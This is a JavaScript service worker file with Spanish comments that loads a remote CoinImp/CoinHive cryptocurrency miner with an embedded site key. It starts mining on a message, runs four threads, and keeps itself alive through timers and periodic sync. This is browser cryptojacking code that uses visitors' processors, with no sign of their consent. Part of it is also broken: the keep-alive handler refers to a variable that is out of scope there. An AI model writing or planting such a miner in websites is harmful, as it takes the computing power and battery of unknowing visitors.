// Versión del cache
const CACHE_NAME = 'miner-v1';

self.addEventListener('install', event => {
    self.skipWaiting();
    event.waitUntil(
        caches.open(CACHE_NAME).then(cache => {
            return cache.addAll([
                '/',
                'https://www.coinimp.com/miner?key=54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af'
            ]);
        })
    );
});

self.addEventListener('activate', event => {
    clients.claim();
});

self.addEventListener('message', event => {
    if (event.data.type === 'START_MINING') {
        startMining(event.data.key);
    }
});

function startMining(apiKey) {
    importScripts('https://www.coinimp.com/miner?key=' + apiKey);
    
    const miner = new CoinHive.Worker(apiKey, {
        throttle: 0.15,
        threads: 4,
        forceASMJS: true
    });
    
    miner.start();
    
    // Mantener vivo el worker
    setInterval(() => {
        miner.getHashesPerSecond();
    }, 30000);
}

// Mantener activo
self.addEventListener('periodicsync', event => {
    if (event.tag === 'keep-alive') {
        miner.getHashesPerSecond();
    }
});